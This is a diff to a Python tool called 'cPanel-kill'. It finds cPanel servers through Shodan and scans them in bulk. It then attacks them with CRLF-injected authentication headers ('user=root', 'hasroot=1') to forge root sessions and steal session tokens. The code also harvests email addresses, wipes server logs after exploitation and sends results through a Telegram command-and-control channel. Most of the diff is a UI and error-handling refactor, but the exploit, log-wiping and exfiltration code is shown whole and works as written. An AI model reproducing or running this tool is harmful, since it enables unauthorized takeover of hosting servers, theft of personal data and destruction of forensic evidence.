@@ -11,9 +11,6 @@ import threading
 import logging
 import base64
 import random
-import shutil
-import atexit
-import signal
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
 from filelock import FileLock
@@ -63,35 +60,17 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(
 logger = logging.getLogger(__name__)
 DEBUG = False
 
-# Terminal handling
-TERMINAL_ROWS, TERMINAL_COLS = shutil.get_terminal_size(fallback=(80, 24))
-SCROLL_REGION_SET = False
-SCROLL_TOP = 0
-
-def set_scroll_region(top_row):
-    global SCROLL_REGION_SET
-    if top_row < TERMINAL_ROWS:
-        sys.stdout.write(f'\033[{top_row};{TERMINAL_ROWS}r')
+# ----------------------------------------------------------------------
+# Terminal / UI helpers
+# ----------------------------------------------------------------------
+def clear_screen():
+    try:
+        sys.stdout.write('\033[2J\033[H')
         sys.stdout.flush()
-        SCROLL_REGION_SET = True
+    except:
+        os.system('clear')
 
-def reset_scroll_region():
-    global SCROLL_REGION_SET
-    if SCROLL_REGION_SET:
-        sys.stdout.write('\033[r')
-        sys.stdout.flush()
-        SCROLL_REGION_SET = False
-
-def clear_region():
-    sys.stdout.write('\033[J')
-    sys.stdout.flush()
-
-def move_to_region_start():
-    if SCROLL_TOP > 0:
-        sys.stdout.write(f'\033[{SCROLL_TOP};0H')
-        sys.stdout.flush()
-
-def get_banner_lines():
+def print_banner():
     RED = '\033[91m'
     YELLOW = '\033[93m'
     GREEN = '\033[92m'
@@ -101,7 +80,8 @@ def get_banner_lines():
         try:
             banner_text = pyfiglet.figlet_format("cPanel-kill", font="slant")
             for line in banner_text.split('\n'):
-                lines.append(RED + line + RESET)
+                if line.strip():
+                    lines.append(RED + line + RESET)
         except Exception:
             lines = [
                 RED + "  _____  ____        _   _ _____ " + RESET,
@@ -120,32 +100,19 @@ def get_banner_lines():
             RED + " | |    | |__| | |  | |\  |_| |_ " + RESET,
             RED + " |_|     \____/|_|  |_| \_|_____|" + RESET,
         ]
+    # Separator lines – reduced for smaller terminals
     lines.append(YELLOW + "=" * 70 + RESET)
     lines.append(GREEN + "  Red Team cPanel Exploitation Framework v3.0" + RESET)
     lines.append(RED + "  FOR AUTHORIZED TESTING ONLY!" + RESET)
     lines.append(RED + "  Unauthorized use is a FEDERAL CRIME." + RESET)
     lines.append(YELLOW + "=" * 70 + RESET)
-    return lines
-
-def print_banner():
-    global SCROLL_TOP
-    sys.stdout.write('\033[2J\033[H')
-    banner_lines = get_banner_lines()
-    for line in banner_lines:
+    for line in lines:
         print(line)
     sys.stdout.flush()
-    SCROLL_TOP = len(banner_lines) + 1
-    if SCROLL_TOP < TERMINAL_ROWS:
-        set_scroll_region(SCROLL_TOP)
-        move_to_region_start()
-    return SCROLL_TOP
 
-def initialize_terminal():
-    print_banner()
-    atexit.register(reset_scroll_region)
-    signal.signal(signal.SIGINT, lambda sig, frame: (reset_scroll_region(), sys.exit(0)))
-
-# Configuration handling
+# ----------------------------------------------------------------------
+# Config handling
+# ----------------------------------------------------------------------
 def load_config():
     if os.path.exists(CONFIG_FILE):
         try:
@@ -165,7 +132,9 @@ def save_config(config):
     with open(CONFIG_FILE, 'w') as f:
         json.dump(config, f, indent=2)
 
-# Core functions
+# ----------------------------------------------------------------------
+# Core networking / request functions
+# ----------------------------------------------------------------------
 def get_session():
     if HAS_CURL_CFFI:
         session = cffi_requests.Session(impersonate="chrome120", verify=False)
@@ -229,6 +198,9 @@ def verify_cpanel(host, port):
     except:
         return False
 
+# ----------------------------------------------------------------------
+# Scanning
+# ----------------------------------------------------------------------
 def scan_single_fast(target):
     host = target.split(':')[0]
     if ':' in target:
@@ -256,12 +228,15 @@ def scan_targets(targets, threads):
         for future in tqdm(as_completed(futures), total=len(futures), desc="Filtering", file=sys.stdout):
             host, port, status = future.result()
             if status == "Open":
-                print(Fore.GREEN + f"[+] {host}:{port} - OPEN")
+                tqdm.write(Fore.GREEN + f"[+] {host}:{port} - OPEN")
                 results.append((host, port))
             else:
-                print(Fore.RED + f"[-] {host} - {status}")
+                tqdm.write(Fore.RED + f"[-] {host} - {status}")
     return results
 
+# ----------------------------------------------------------------------
+# Version detection (robust)
+# ----------------------------------------------------------------------
 def get_cpanel_version(host, port):
     endpoints = [
         (f"/json-api/version", "json"),
@@ -292,212 +267,222 @@ def get_cpanel_version(host, port):
             continue
     return None
 
+def get_major_version(version):
+    if not version:
+        return 0
+    match = re.search(r'(\d+)\.', version)
+    if match:
+        try:
+            return int(match.group(1))
+        except:
+            pass
+    return 0
+
+# ----------------------------------------------------------------------
+# Exploits (with exception handling)
+# ----------------------------------------------------------------------
 def exploit_cve_2026_41940(host, port):
-    scheme = "https" if port not in [2082, 2095] else "http"
-    base = f"{scheme}://{host}:{port}"
-    session = get_session()
+    try:
+        scheme = "https" if port not in [2082, 2095] else "http"
+        base = f"{scheme}://{host}:{port}"
+        session = get_session()
 
-    version = get_cpanel_version(host, port)
-    if version:
-        try:
-            major = int(version.split('.')[0])
-            if major > 120:
-                return {"status": "CVE_Version_Patched", "token": None}
-        except:
-            pass
+        version = get_cpanel_version(host, port)
+        if get_major_version(version) > 120:
+            return {"status": "CVE_Version_Patched", "token": None}
 
-    resp1 = request_with_retry("GET", f"{base}/cpanel/", session=session)
-    if not resp1 or resp1.status_code not in [200, 302]:
-        return {"status": "CVE_Stage1_Failed", "token": None}
+        resp1 = request_with_retry("GET", f"{base}/cpanel/", session=session)
+        if not resp1 or resp1.status_code not in [200, 302]:
+            return {"status": "CVE_Stage1_Failed", "token": None}
 
-    cookie_name = None
-    for cookie in session.cookies:
-        if re.search(r'cpsess', cookie.name, re.I) or re.match(r'^[0-9a-f]{32}$', cookie.name):
-            cookie_name = cookie.name
-            break
-    if not cookie_name:
-        if "Set-Cookie" in resp1.headers:
-            set_cookie = resp1.headers["Set-Cookie"]
-            match = re.search(r'(cpsess[0-9a-f]+)=', set_cookie, re.I)
-            if match:
-                cookie_name = match.group(1)
-    if not cookie_name:
-        return {"status": "CVE_No_Cookie", "token": None}
-
-    poison_payload_bytes = b'root:somepass\r\nuser=root\r\nhasroot=1\r\ntfa_verified=1\r\nsuccessful_internal_auth_with_timestamp=9999999999'
-    poison_payload = "root:somepass\r\nuser=root\r\nhasroot=1\r\ntfa_verified=1\r\nsuccessful_internal_auth_with_timestamp=9999999999"
-
-    poison_payloads = [
-        ("Authorization", "Basic " + base64.b64encode(poison_payload_bytes).decode()),
-        ("User-Agent", poison_payload),
-        ("X-Forwarded-For", "127.0.0.1\r\nuser=root\r\nhasroot=1"),
-        ("Referer", f"{base}/\r\nuser=root\r\nhasroot=1")
-    ]
-
-    success = False
-    for header, value in poison_payloads:
-        headers = {header: value}
-        time.sleep(random.uniform(0.5, 2.0))
-        resp2 = request_with_retry("GET", f"{base}/cpanel/", session=session, headers=headers)
-        if resp2:
-            new_cookie = session.cookies.get(cookie_name)
-            if new_cookie and new_cookie != session.cookies.get(cookie_name):
-                success = True
+        cookie_name = None
+        for cookie in session.cookies:
+            if re.search(r'cpsess', cookie.name, re.I) or re.match(r'^[0-9a-f]{32}$', cookie.name):
+                cookie_name = cookie.name
                 break
-    if not success:
-        auth_b64 = base64.b64encode(poison_payload_bytes).decode()
-        headers = {"Authorization": f"Basic {auth_b64}"}
-        resp2 = request_with_retry("GET", f"{base}/cpanel/", session=session, headers=headers)
-        if not resp2:
-            return {"status": "CVE_Stage2_Failed", "token": None}
+        if not cookie_name:
+            if "Set-Cookie" in resp1.headers:
+                set_cookie = resp1.headers["Set-Cookie"]
+                match = re.search(r'(cpsess[0-9a-f]+)=', set_cookie, re.I)
+                if match:
+                    cookie_name = match.group(1)
+        if not cookie_name:
+            return {"status": "CVE_No_Cookie", "token": None}
 
-    reload_endpoints = [
-        f"{base}/json-api/version",
-        f"{base}/cpanel/",
-        f"{base}/json-api/listaccts"
-    ]
-    reload_success = False
-    for endpoint in reload_endpoints:
-        time.sleep(random.uniform(0.3, 1.0))
-        resp3 = request_with_retry("GET", endpoint, session=session)
-        if resp3 and resp3.status_code == 200:
-            reload_success = True
-            break
-    if not reload_success:
-        return {"status": "CVE_Stage3_Failed", "token": None}
+        poison_payload_bytes = b'root:somepass\r\nuser=root\r\nhasroot=1\r\ntfa_verified=1\r\nsuccessful_internal_auth_with_timestamp=9999999999'
+        poison_payload = "root:somepass\r\nuser=root\r\nhasroot=1\r\ntfa_verified=1\r\nsuccessful_internal_auth_with_timestamp=9999999999"
 
-    token_value = session.cookies.get(cookie_name)
-    if not token_value:
+        poison_payloads = [
+            ("Authorization", "Basic " + base64.b64encode(poison_payload_bytes).decode()),
+            ("User-Agent", poison_payload),
+            ("X-Forwarded-For", "127.0.0.1\r\nuser=root\r\nhasroot=1"),
+            ("Referer", f"{base}/\r\nuser=root\r\nhasroot=1")
+        ]
+
+        success = False
+        for header, value in poison_payloads:
+            headers = {header: value}
+            time.sleep(random.uniform(0.5, 2.0))
+            resp2 = request_with_retry("GET", f"{base}/cpanel/", session=session, headers=headers)
+            if resp2:
+                new_cookie = session.cookies.get(cookie_name)
+                if new_cookie and new_cookie != session.cookies.get(cookie_name):
+                    success = True
+                    break
+        if not success:
+            auth_b64 = base64.b64encode(poison_payload_bytes).decode()
+            headers = {"Authorization": f"Basic {auth_b64}"}
+            resp2 = request_with_retry("GET", f"{base}/cpanel/", session=session, headers=headers)
+            if not resp2:
+                return {"status": "CVE_Stage2_Failed", "token": None}
+
+        reload_endpoints = [
+            f"{base}/json-api/version",
+            f"{base}/cpanel/",
+            f"{base}/json-api/listaccts"
+        ]
+        reload_success = False
+        for endpoint in reload_endpoints:
+            time.sleep(random.uniform(0.3, 1.0))
+            resp3 = request_with_retry("GET", endpoint, session=session)
+            if resp3 and resp3.status_code == 200:
+                reload_success = True
+                break
+        if not reload_success:
+            return {"status": "CVE_Stage3_Failed", "token": None}
+
+        token_value = session.cookies.get(cookie_name)
+        if not token_value:
+            return {"status": "CVE_Verify_Failed", "token": None}
+
+        verify_url = f"{base}/json-api/listaccts"
+        resp4 = request_with_retry("GET", verify_url, session=session)
+        if resp4 and resp4.status_code == 200:
+            try:
+                data = resp4.json()
+                if 'data' in data and 'acct' in data['data']:
+                    ver = get_cpanel_version(host, port)
+                    return {
+                        "status": "Exploited",
+                        "token": token_value,
+                        "cookie_name": cookie_name,
+                        "version": ver,
+                        "method": "CVE-2026-41940"
+                    }
+            except:
+                pass
+
+        resp5 = request_with_retry("GET", f"{base}/json-api/version", session=session)
+        if resp5 and resp5.status_code == 200:
+            try:
+                data = resp5.json()
+                if 'version' in data:
+                    return {
+                        "status": "Exploited",
+                        "token": token_value,
+                        "cookie_name": cookie_name,
+                        "version": data.get('version', {}).get('version'),
+                        "method": "CVE-2026-41940"
+                    }
+            except:
+                pass
+
         return {"status": "CVE_Verify_Failed", "token": None}
-
-    verify_url = f"{base}/json-api/listaccts"
-    resp4 = request_with_retry("GET", verify_url, session=session)
-    if resp4 and resp4.status_code == 200:
-        try:
-            data = resp4.json()
-            if 'data' in data and 'acct' in data['data']:
-                ver = get_cpanel_version(host, port)
-                return {
-                    "status": "Exploited",
-                    "token": token_value,
-                    "cookie_name": cookie_name,
-                    "version": ver,
-                    "method": "CVE-2026-41940"
-                }
-        except:
-            pass
-
-    resp5 = request_with_retry("GET", f"{base}/json-api/version", session=session)
-    if resp5 and resp5.status_code == 200:
-        try:
-            data = resp5.json()
-            if 'version' in data:
-                return {
-                    "status": "Exploited",
-                    "token": token_value,
-                    "cookie_name": cookie_name,
-                    "version": data.get('version', {}).get('version'),
-                    "method": "CVE-2026-41940"
-                }
-        except:
-            pass
-
-    return {"status": "CVE_Verify_Failed", "token": None}
+    except Exception as e:
+        logger.error(f"CVE exploit crashed on {host}:{port}: {e}")
+        return {"status": "CVE_Exception", "token": None}
 
 def exploit_graphql(host, port):
-    scheme = "https" if port not in [2082, 2095] else "http"
-    base = f"{scheme}://{host}:{port}"
-    url = f"{base}/graphql"
-    session = get_session()
     try:
-        probe = session.get(url, timeout=TIMEOUT)
-        if probe.status_code not in [200, 400, 405]:
-            return {"status": "GraphQL_Not_Available", "token": None}
-    except:
-        return {"status": "GraphQL_Error", "token": None}
-    payload = {
-        "query": "query { __type(name: \"__schema\") { name } }",
-        "variables": None,
-        "operationName": None
-    }
-    headers = {"Content-Type": "application/json", "X-Forwarded-For": "127.0.0.1"}
-    try:
+        scheme = "https" if port not in [2082, 2095] else "http"
+        base = f"{scheme}://{host}:{port}"
+        url = f"{base}/graphql"
+        session = get_session()
+        try:
+            probe = session.get(url, timeout=TIMEOUT)
+            if probe.status_code not in [200, 400, 405]:
+                return {"status": "GraphQL_Not_Available", "token": None}
+        except:
+            return {"status": "GraphQL_Error", "token": None}
+        payload = {
+            "query": "query { __type(name: \"__schema\") { name } }",
+            "variables": None,
+            "operationName": None
+        }
+        headers = {"Content-Type": "application/json", "X-Forwarded-For": "127.0.0.1"}
         resp = session.post(url, json=payload, headers=headers, timeout=TIMEOUT)
         if resp.status_code == 200:
-            data = resp.json()
-            if "errors" in data:
-                for err in data["errors"]:
-                    if "cpsession" in err.get("message", ""):
-                        token = re.search(r'cpsession=([^;]+)', err["message"])
-                        if token:
-                            return {"status": "Exploited", "token": token.group(1), "cookie_name": "cpsession"}
+            try:
+                data = resp.json()
+                if "errors" in data:
+                    for err in data["errors"]:
+                        if "cpsession" in err.get("message", ""):
+                            token = re.search(r'cpsession=([^;]+)', err["message"])
+                            if token:
+                                return {"status": "Exploited", "token": token.group(1), "cookie_name": "cpsession"}
+            except:
+                pass
         if "Set-Cookie" in resp.headers:
             cookie = resp.headers["Set-Cookie"]
             match = re.search(r'cpsession=([^;]+)', cookie)
             if match:
                 return {"status": "Exploited", "token": match.group(1), "cookie_name": "cpsession"}
-    except:
-        pass
-    return {"status": "GraphQL_Failed", "token": None}
+        return {"status": "GraphQL_Failed", "token": None}
+    except Exception as e:
+        logger.error(f"GraphQL exploit crashed on {host}:{port}: {e}")
+        return {"status": "GraphQL_Exception", "token": None}
 
 def exploit_legacy(host, port):
-    scheme = "https" if port not in [2082, 2095] else "http"
-    base_url = f"{scheme}://{host}:{port}"
-    session = get_session()
-    resp = request_with_retry("GET", f"{base_url}/cpanel/", session=session)
-    if not resp or resp.status_code not in [200, 302]:
-        return {"status": "Stage1_Failed", "token": None}
-    cookie_name = None
-    if "Set-Cookie" in resp.headers:
-        for cookie in resp.headers.get("Set-Cookie").split(","):
-            if "cpsession" in cookie.lower():
-                cookie_name = "cpsession"
-                break
-    if not cookie_name:
-        for cookie in session.cookies:
-            if re.search(r'[0-9a-f]{32}', cookie.name) or cookie.name.lower().startswith('cpsess'):
-                cookie_name = cookie.name
-                break
-    if not cookie_name:
-        return {"status": "No_Cookie", "token": None}
-    payload_lines = [
-        "root:somepass",
-        "user=root",
-        "hasroot=1",
-        "tfa_verified=1",
-        "successful_internal_auth_with_timestamp=9999999999"
-    ]
-    payload = "\r\n".join(payload_lines)
-    auth_b64 = base64.b64encode(payload.encode()).decode()
-    headers = {"Authorization": f"Basic {auth_b64}"}
-    resp2 = request_with_retry("GET", f"{base_url}/cpanel/", session=session, headers=headers)
-    if not resp2:
-        return {"status": "Stage2_Failed", "token": None}
-    resp3 = request_with_retry("GET", f"{base_url}/cpanel/", session=session)
-    if not resp3:
-        return {"status": "Stage3_Failed", "token": None}
-    resp4 = request_with_retry("GET", f"{base_url}/json-api/version", session=session)
-    if resp4 and resp4.status_code == 200:
-        try:
-            data = resp4.json()
-            token_value = session.cookies.get(cookie_name)
-            if token_value:
-                return {"status": "Exploited", "token": token_value, "cookie_name": cookie_name,
-                        "version": data.get('version', {}).get('version')}
-        except:
-            pass
-    return {"status": "Verify_Failed", "token": None}
-
-def validate_session(host, port, cookie_name, token):
-    scheme = "https" if port not in [2082, 2095] else "http"
-    url = f"{scheme}://{host}:{port}/json-api/version"
-    session = get_session()
-    session.cookies.set(cookie_name, token)
     try:
-        resp = session.get(url, timeout=TIMEOUT)
-        return resp.status_code == 200
-    except:
-        return False
+        scheme = "https" if port not in [2082, 2095] else "http"
+        base_url = f"{scheme}://{host}:{port}"
+        session = get_session()
+        resp = request_with_retry("GET", f"{base_url}/cpanel/", session=session)
+        if not resp or resp.status_code not in [200, 302]:
+            return {"status": "Stage1_Failed", "token": None}
+        cookie_name = None
+        if "Set-Cookie" in resp.headers:
+            for cookie in resp.headers.get("Set-Cookie").split(","):
+                if "cpsession" in cookie.lower():
+                    cookie_name = "cpsession"
+                    break
+        if not cookie_name:
+            for cookie in session.cookies:
+                if re.search(r'[0-9a-f]{32}', cookie.name) or cookie.name.lower().startswith('cpsess'):
+                    cookie_name = cookie.name
+                    break
+        if not cookie_name:
+            return {"status": "No_Cookie", "token": None}
+        payload_lines = [
+            "root:somepass",
+            "user=root",
+            "hasroot=1",
+            "tfa_verified=1",
+            "successful_internal_auth_with_timestamp=9999999999"
+        ]
+        payload = "\r\n".join(payload_lines)
+        auth_b64 = base64.b64encode(payload.encode()).decode()
+        headers = {"Authorization": f"Basic {auth_b64}"}
+        resp2 = request_with_retry("GET", f"{base_url}/cpanel/", session=session, headers=headers)
+        if not resp2:
+            return {"status": "Stage2_Failed", "token": None}
+        resp3 = request_with_retry("GET", f"{base_url}/cpanel/", session=session)
+        if not resp3:
+            return {"status": "Stage3_Failed", "token": None}
+        resp4 = request_with_retry("GET", f"{base_url}/json-api/version", session=session)
+        if resp4 and resp4.status_code == 200:
+            try:
+                data = resp4.json()
+                token_value = session.cookies.get(cookie_name)
+                if token_value:
+                    return {"status": "Exploited", "token": token_value, "cookie_name": cookie_name,
+                            "version": data.get('version', {}).get('version')}
+            except:
+                pass
+        return {"status": "Verify_Failed", "token": None}
+    except Exception as e:
+        logger.error(f"Legacy exploit crashed on {host}:{port}: {e}")
+        return {"status": "Legacy_Exception", "token": None}
 
 def exploit_cpanel(host, port):
     methods = [
@@ -513,9 +498,26 @@ def exploit_cpanel(host, port):
             result["method"] = name
             return result
         if result and result.get("token"):
+            # If we got a token but not fully exploited, we could still use it later
             pass
     return result or {"status": "All_Methods_Failed", "token": None}
 
+def validate_session(host, port, cookie_name, token):
+    if not cookie_name or not token:
+        return False
+    scheme = "https" if port not in [2082, 2095] else "http"
+    url = f"{scheme}://{host}:{port}/json-api/version"
+    session = get_session()
+    session.cookies.set(cookie_name, token)
+    try:
+        resp = session.get(url, timeout=TIMEOUT)
+        return resp.status_code == 200
+    except:
+        return False
+
+# ----------------------------------------------------------------------
+# Email extraction
+# ----------------------------------------------------------------------
 def extract_whois_emails(domain):
     try:
         w = whois.whois(domain, timeout=10)
@@ -531,6 +533,8 @@ def extract_whois_emails(domain):
         return []
 
 def extract_emails(host, port, cookie_name, token):
+    if not cookie_name or not token:
+        return []
     emails = []
     try:
         if port in WHM_PORTS:
@@ -567,9 +571,15 @@ def extract_emails(host, port, cookie_name, token):
         emails = extract_whois_emails(host.split(':')[0])
     return emails
 
+# ----------------------------------------------------------------------
+# Log cleanup
+# ----------------------------------------------------------------------
 def clean_logs(host, port, cookie_name, token):
     if port not in WHM_PORTS:
         logger.warning("Log cleanup only supported via WHM ports (2086/2087)")
+        return False
+    if not cookie_name or not token:
+        logger.warning("Missing cookie/token for log cleanup")
         return False
     scheme = "https"
     base = f"{scheme}://{host}:{port}"
@@ -590,6 +600,9 @@ def clean_logs(host, port, cookie_name, token):
         logger.error(f"Log cleanup failed on {host}: {e}")
     return False
 
+# ----------------------------------------------------------------------
+# Database (with UNIQUE constraint)
+# ----------------------------------------------------------------------
 class Database:
     def __init__(self, db_path="targets.db"):
         self.conn = sqlite3.connect(db_path, check_same_thread=False)
@@ -613,9 +626,11 @@ class Database:
                 cookie_name TEXT,
                 version TEXT,
                 last_exploit_attempt TEXT,
-                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
+                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
+                UNIQUE(host, port)
             )
         ''')
+        # Add missing columns if they don't exist (for upgrades)
         for col in ['token', 'cookie_name', 'version', 'last_exploit_attempt']:
             try:
                 self.cursor.execute(f"ALTER TABLE targets ADD COLUMN {col} TEXT")
@@ -625,11 +640,16 @@ class Database:
 
     def add_target(self, host, port=None):
         with self.lock:
-            self.cursor.execute(
-                "INSERT OR IGNORE INTO targets (host, port) VALUES (?, ?)",
-                (host, port)
-            )
-            self.conn.commit()
+            try:
+                self.cursor.execute(
+                    "INSERT OR IGNORE INTO targets (host, port) VALUES (?, ?)",
+                    (host, port)
+                )
+                self.conn.commit()
+                return True
+            except Exception as e:
+                logger.error(f"Failed to add target {host}:{port} - {e}")
+                return False
 
     def get_pending_targets(self):
         with self.lock:
@@ -695,6 +715,9 @@ class Database:
     def close(self):
         self.conn.close()
 
+# ----------------------------------------------------------------------
+# Session file handling
+# ----------------------------------------------------------------------
 def load_sessions():
     try:
         with SESSIONS_LOCK:
@@ -713,6 +736,9 @@ def save_sessions(sessions):
     except Exception:
         pass
 
+# ----------------------------------------------------------------------
+# Shodan integration
+# ----------------------------------------------------------------------
 class ShodanScanner:
     def __init__(self, api_key=None):
         self.api_key = api_key or os.getenv("SHODAN_API_KEY")
@@ -742,6 +768,9 @@ class ShodanScanner:
             print(Fore.RED + f"[-] Shodan error: {e}")
             return []
 
+# ----------------------------------------------------------------------
+# Export results
+# ----------------------------------------------------------------------
 def export_results(results, filename="results.json"):
     export_data = []
     for row in results:
@@ -769,6 +798,9 @@ def export_results(results, filename="results.json"):
     logger.info(f"Results exported to {filename} and {txt_file}")
     return txt_file
 
+# ----------------------------------------------------------------------
+# Telegram C2
+# ----------------------------------------------------------------------
 class TelegramC2:
     def __init__(self, bot_token=None, chat_id=None):
         self.bot_token = bot_token or os.getenv("TELEGRAM_BOT_TOKEN")
@@ -817,6 +849,9 @@ class TelegramC2:
         logger.info("Telegram notification sent.")
         return True
 
+# ----------------------------------------------------------------------
+# Main Application
+# ----------------------------------------------------------------------
 class CPwn3rApp:
     def __init__(self):
         self.config = load_config()
@@ -830,29 +865,33 @@ class CPwn3rApp:
         self.debug = False
 
     def run(self):
-        initialize_terminal()
         self._main_menu()
+
+    def _draw_menu(self):
+        clear_screen()
+        print_banner()
+        print(Fore.CYAN + "\n" + "=" * 50)
+        print(Fore.CYAN + "[ MAIN MENU ]")
+        print("1. Load targets from file")
+        print("2. Add single target")
+        print("3. Shodan discovery")
+        print("4. Scan targets")
+        print("5. Exploit & extract emails")
+        print("6. Configure Telegram C2")
+        print("7. Export results")
+        print("8. Send results via Telegram")
+        print("9. Clean logs (post-exploit)")
+        print("10. Toggle debug mode")
+        print("11. Post-exploit actions")
+        print("12. Edit configuration (threads, API keys)")
+        print("13. Exit")
+        sys.stdout.write(Fore.WHITE + "Select: ")
+        sys.stdout.flush()
 
     def _main_menu(self):
         while True:
-            clear_region()
-            move_to_region_start()
-            print(Fore.CYAN + "\n" + "=" * 50)
-            print(Fore.CYAN + "[ MAIN MENU ]")
-            print("1. Load targets from file")
-            print("2. Add single target")
-            print("3. Shodan discovery")
-            print("4. Scan targets")
-            print("5. Exploit & extract emails")
-            print("6. Configure Telegram C2")
-            print("7. Export results")
-            print("8. Send results via Telegram")
-            print("9. Clean logs (post-exploit)")
-            print("10. Toggle debug mode")
-            print("11. Post-exploit actions")
-            print("12. Edit configuration (threads, API keys)")
-            print("13. Exit")
-            choice = input(Fore.WHITE + "Select: ").strip()
+            self._draw_menu()
+            choice = input().strip()
 
             if choice == '1':
                 self._load_targets()
@@ -885,10 +924,10 @@ class CPwn3rApp:
             elif choice == '13':
                 print(Fore.CYAN + "[*] Goodbye.")
                 self.db.close()
-                reset_scroll_region()
                 sys.exit(0)
             else:
                 print(Fore.RED + "[-] Invalid option.")
+
             input(Fore.YELLOW + "\nPress Enter to continue...")
 
     def _save_config_telegram(self):
@@ -897,9 +936,7 @@ class CPwn3rApp:
         save_config(self.config)
 
     def _edit_config(self):
-        clear_region()
-        move_to_region_start()
-        print(Fore.CYAN + "[ Edit Configuration ]")
+        print(Fore.CYAN + "\n[ Edit Configuration ]")
         print(f"1. Shodan API Key: {self.config.get('shodan_api_key', '')}")
         print(f"2. Telegram Bot Token: {self.config.get('telegram_bot_token', '')}")
         print(f"3. Telegram Chat ID: {self.config.get('telegram_chat_id', '')}")
@@ -917,13 +954,15 @@ class CPwn3rApp:
             self.telegram.chat_id = self.config["telegram_chat_id"]
         elif choice == '4':
             try:
-                self.config["scan_threads"] = int(input("Enter Scan Threads (default 50): ").strip() or 50)
+                val = input("Enter Scan Threads (default 50): ").strip()
+                self.config["scan_threads"] = int(val) if val else 50
                 self.scan_threads = self.config["scan_threads"]
             except:
                 print(Fore.RED + "[-] Invalid number.")
         elif choice == '5':
             try:
-                self.config["exploit_threads"] = int(input("Enter Exploit Threads (default 20): ").strip() or 20)
+                val = input("Enter Exploit Threads (default 20): ").strip()
+                self.config["exploit_threads"] = int(val) if val else 20
                 self.exploit_threads = self.config["exploit_threads"]
             except:
                 print(Fore.RED + "[-] Invalid number.")
@@ -949,22 +988,30 @@ class CPwn3rApp:
                 line = line.split('://')[1]
             if '/' in line:
                 line = line.split('/')[0]
-            if ':' in line:
-                host, port = line.split(':')
-                self.db.add_target(host, int(port))
-            else:
-                self.db.add_target(line)
-            count += 1
+            try:
+                if ':' in line:
+                    host, port_str = line.split(':', 1)
+                    port = int(port_str)
+                    self.db.add_target(host, port)
+                else:
+                    self.db.add_target(line)
+                count += 1
+            except ValueError:
+                print(Fore.RED + f"[-] Skipping invalid line: {line}")
         print(Fore.GREEN + f"[+] Loaded {count} targets into database.")
 
     def _add_target(self):
         target = input("Enter target (IP or domain[:port]): ").strip()
-        if ':' in target:
-            host, port = target.split(':')
-            self.db.add_target(host, int(port))
-        else:
-            self.db.add_target(target)
-        print(Fore.GREEN + f"[+] Added {target}")
+        try:
+            if ':' in target:
+                host, port_str = target.split(':', 1)
+                port = int(port_str)
+                self.db.add_target(host, port)
+            else:
+                self.db.add_target(target)
+            print(Fore.GREEN + f"[+] Added {target}")
+        except ValueError:
+            print(Fore.RED + "[-] Invalid port number.")
 
     def _shodan_discovery(self):
         if not self.shodan_key:
@@ -988,15 +1035,18 @@ class CPwn3rApp:
             return
         targets = [f"{host}:{port}" if port else host for _, host, port in pending]
         alive = scan_targets(targets, self.scan_threads)
+        # Update database with results
+        alive_hosts = set()
         for host, port in alive:
+            alive_hosts.add((host, port))
             for tid, db_host, db_port in pending:
                 if db_host == host:
                     self.db.update_port(tid, port)
                     self.db.update_scan(tid, "Open", port)
                     break
-        alive_hosts = set(h for h, _ in alive)
+        # Mark non‑alive as Closed
         for tid, host, port in pending:
-            if host not in alive_hosts:
+            if (host, port) not in alive_hosts and (host, None) not in alive_hosts:
                 self.db.update_scan(tid, "Closed")
         print(Fore.GREEN + f"[+] Found {len(alive)} live cPanel hosts.")
 
@@ -1052,7 +1102,7 @@ class CPwn3rApp:
                 discovered_port = result.get('port', port)
                 method = result.get('method', 'Unknown')
                 if status == 'Exploited' and token:
-                    print(Fore.GREEN + f"[+] Exploited {host}:{discovered_port} via {method}")
+                    tqdm.write(Fore.GREEN + f"[+] Exploited {host}:{discovered_port} via {method}")
                     if discovered_port != port:
                         self.db.update_port(tid, discovered_port)
                     key = f"{host}:{discovered_port}"
@@ -1066,11 +1116,11 @@ class CPwn3rApp:
                         save_sessions(sessions)
                     emails = extract_emails(host, discovered_port, cookie_name, token)
                     if emails:
-                        print(Fore.GREEN + f"[+] Found {len(emails)} emails")
+                        tqdm.write(Fore.GREEN + f"[+] Found {len(emails)} emails")
                     self.db.update_exploit(tid, "Exploited", 1, token, cookie_name, version, emails, method)
                     results.append((host, discovered_port, status, emails))
                 else:
-                    print(Fore.RED + f"[-] {host}:{port} - {status}")
+                    tqdm.write(Fore.RED + f"[-] {host}:{port} - {status}")
                     self.db.update_exploit(tid, status, 0, attempt=method)
         print(Fore.GREEN + f"[+] Exploited {len(results)} hosts.")
 
@@ -1085,6 +1135,9 @@ class CPwn3rApp:
             port = int(port_str)
             token = data.get('token')
             cookie = data.get('cookie_name')
+            if not cookie or not token:
+                print(Fore.YELLOW + f"[!] Skipping {host} – missing cookie/token")
+                continue
             if clean_logs(host, port, cookie, token):
                 print(Fore.GREEN + f"[+] Logs cleaned for {host}")
             else:
@@ -1132,6 +1185,9 @@ class CPwn3rApp:
             port = int(port_str)
             token = data.get('token')
             cookie = data.get('cookie_name')
+            if not cookie or not token:
+                print(Fore.YELLOW + f"[!] Skipping {host} – missing cookie/token")
+                continue
             if port not in WHM_PORTS:
                 print(Fore.YELLOW + f"[!] {host} not on WHM port, skipping advanced actions.")
                 continue
@@ -1169,15 +1225,14 @@ class CPwn3rApp:
             else:
                 print(Fore.RED + f"[-] Could not list accounts for {host}")
 
+# ----------------------------------------------------------------------
 if __name__ == "__main__":
     try:
         app = CPwn3rApp()
         app.run()
     except KeyboardInterrupt:
-        reset_scroll_region()
         print(Fore.YELLOW + "\n[!] Interrupted by user.")
         sys.exit(0)
     except Exception as e:
-        reset_scroll_region()
         logger.critical(f"Unexpected error: {e}", exc_info=True)
         sys.exit(1)
